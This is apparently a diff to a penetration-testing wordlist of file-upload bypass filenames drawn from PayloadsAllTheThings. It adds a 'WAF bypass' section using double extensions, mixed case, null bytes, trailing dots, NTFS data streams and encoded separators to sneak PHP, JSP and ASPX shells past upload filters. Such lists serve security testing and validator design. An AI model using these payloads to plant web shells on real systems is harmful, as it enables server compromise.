@@ -1,6 +1,6 @@
 # File Upload bypass payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 34 payloads
+# Total: 47 payloads
 shell.php
 shell.php5
 shell.php7
@@ -37,3 +37,19 @@ shell.php::$DATA
 shell.jsp;.jpg
 shell.aspx;.jpg
 shell.php%00.png
+
+# --- WAF bypass ---
+# double extension / ADS / trailing dot
+x.php.jpg
+x.jpg.php
+x.pHp5
+x.pHp7
+x.php7.jpg
+x.php%00.png
+x.php.
+x.php::$DATA
+x.user.ini
+x.php/.png
+x.php%2f.png
+x.php;.jpg
+x.php%3b.jpg
